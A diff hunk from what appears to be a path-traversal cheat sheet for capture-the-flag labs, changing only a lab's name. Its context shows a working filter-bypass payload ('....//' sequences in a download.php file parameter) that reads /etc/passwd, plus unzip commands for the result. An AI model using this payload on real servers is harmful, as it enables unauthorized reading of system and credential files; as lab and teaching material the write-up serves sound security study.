@@ -204,7 +204,7 @@ file /tmp/r.bin            # → "Zip archive data"
 unzip -p /tmp/r.bin        # → actual /etc/passwd content
 ```
 
-The depth of `....//` repetitions must traverse from the script's CWD up to `/`. Probe with `....//`, `....//....//`, etc. until a non-empty ZIP comes back. (HTB Snoopy `/download.php?file=....//....//....//....//etc/passwd` — 4 levels needed; the missing dir is silently swallowed by the filter, so use 1-2 extra `....//` for safety.)
+The depth of `....//` repetitions must traverse from the script's CWD up to `/`. Probe with `....//`, `....//....//`, etc. until a non-empty ZIP comes back. (the Snoopy lab `/download.php?file=....//....//....//....//etc/passwd` — 4 levels needed; the missing dir is silently swallowed by the filter, so use 1-2 extra `....//` for safety.)
 
 ## `os.path.join` / `pathlib` absolute-component bypass
 
